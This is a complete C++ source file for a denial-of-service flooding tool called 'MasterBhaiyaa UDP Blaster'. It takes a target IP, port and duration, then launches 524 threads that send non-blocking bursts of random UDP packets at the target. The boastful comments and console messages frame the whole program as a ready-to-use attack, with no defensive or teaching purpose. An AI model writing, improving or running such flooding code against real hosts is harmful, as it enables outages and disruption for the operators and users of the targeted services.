#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#define THREAD_COUNT 524
#define DEFAULT_PAYLOAD_SIZE 25  // 🔥 Increased for more impact
#define BINARY_NAME "MasterBhaiyaa"

std::atomic<bool> stop_flag(false);

struct AttackConfig {
    std::string ip;
    int port;
    int duration;
    int payload_size;
};

// Signal handler
void handle_signal(int signal) {
    std::cout << "\n[!] Interrupt received. Stopping attack...\n";
    stop_flag = true;
}

// Validate IP Address
bool is_valid_ip(const std::string &ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip.c_str(), &(sa.sin_addr)) != 0;
}

// Generate random payload
void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
    buffer.resize(size);
    for (size_t i = 0; i < size; i++) {
        buffer[i] = static_cast<uint8_t>(rand() % 256);
    }
}

// **🔥 Optimized UDP Attack Function**
void udp_attack(const AttackConfig &config) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    // **🔥 Socket Optimizations**
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    fcntl(sock, F_SETFL, O_NONBLOCK);  // Non-blocking mode for speed

    sockaddr_in target_addr = {};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config.port);
    target_addr.sin_addr.s_addr = inet_addr(config.ip.c_str());

    std::vector<uint8_t> payload;
    generate_payload(payload, config.payload_size);

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(config.duration);
    long packets_sent = 0;

    while (std::chrono::steady_clock::now() < end_time && !stop_flag) {
        for (int i = 0; i < 100; i++) {  // **🔥 Send 100 packets per loop**
            sendto(sock, payload.data(), payload.size(), 0, 
                   (struct sockaddr *)&target_addr, sizeof(target_addr));
            packets_sent++;
        }
        generate_payload(payload, config.payload_size);  // **🔥 Change payload dynamically**
    }

    close(sock);
    std::cout << "[✔] Thread completed. Packets sent: " << packets_sent << "\n";
}

// **🔥 Main Execution**
int main(int argc, char *argv[]) {
    if (argc < 4 || argc > 5) {
        std::cerr << "Usage: ./MasterBhaiyaa <ip> <port> <duration> [payload_size]\n";
        return EXIT_FAILURE;
    }

    AttackConfig config;
    config.ip = argv[1];
    config.port = std::stoi(argv[2]);
    config.duration = std::stoi(argv[3]);
    config.payload_size = (argc == 5) ? std::stoi(argv[4]) : DEFAULT_PAYLOAD_SIZE;

    // **Validate IP Address**
    if (!is_valid_ip(config.ip)) {
        std::cerr << "Invalid IP address: " << config.ip << "\n";
        return EXIT_FAILURE;
    }

    std::signal(SIGINT, handle_signal);

    std::cout << "=====================================\n";
    std::cout << "      MasterBhaiyaa UDP Blaster      \n";
    std::cout << "=====================================\n";
    std::cout << "Target: " << config.ip << ":" << config.port << "\n";
    std::cout << "Duration: " << config.duration << " seconds\n";
    std::cout << "Threads: " << THREAD_COUNT << "\n";
    std::cout << "Payload Size: " << config.payload_size << " bytes\n";
    std::cout << "=====================================\n\n";

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(udp_attack, config);
        std::cout << "[+] Thread " << i + 1 << " launched.\n";
    }

    for (auto &thread : threads) {
        thread.join();
    }

    std::cout << "\n[✔] Attack completed successfully.\n";
    std::cout << "© @MasterBhaiyaa\n";

    return EXIT_SUCCESS;
}
